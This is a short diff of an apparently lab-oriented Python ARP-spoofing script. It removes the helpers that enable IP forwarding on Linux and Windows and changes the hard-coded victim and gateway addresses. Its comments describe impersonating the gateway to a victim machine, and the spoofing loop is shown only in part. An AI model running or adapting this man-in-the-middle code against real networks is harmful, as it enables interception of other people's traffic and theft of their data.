@@ -4,38 +4,6 @@ import time
 import os
 import sys
 
-def _enable_linux_iproute():
-    """
-    Enables IP route ( IP Forward ) in linux-based distro
-    """
-    file_path = "/proc/sys/net/ipv4/ip_forward"
-    with open(file_path) as f:
-        if f.read() == 1:
-            # already enabled
-            return
-    with open(file_path, "w") as f:
-        print(1, file=f)
-
-def _enable_windows_iproute():
-    """
-    Enables IP route (IP Forwarding) in Windows
-    """
-    from services import WService
-    # enable Remote Access service
-    service = WService("RemoteAccess")
-    service.start()
-
-
-def enable_ip_route(verbose=True):
-    """
-    Enables IP forwarding
-    """
-    if verbose:
-        print("[!] Enabling IP Routing...")
-    _enable_windows_iproute() if "nt" in os.name else _enable_linux_iproute()
-    if verbose:
-        print("[!] IP Routing enabled.")
-
 #Returns MAC address of any device connected to the network
 #If ip is down, returns None instead
 def get_mac(ip):
@@ -74,13 +42,12 @@ def restore(target_ip, host_ip, verbose=True):
 
 if __name__ == "__main__":
     # victim ip address
-    target = "192.168.1.100"
+    target = "192.168.56.101"
     # gateway ip address
-    host = "131.155.195.114"
+    host = "192.168.178.24"
     # print progress to the screen
     verbose = True
     # enable ip forwarding
-    enable_ip_route()
     try:
         while True:
             # telling the `target` that we are the `host`
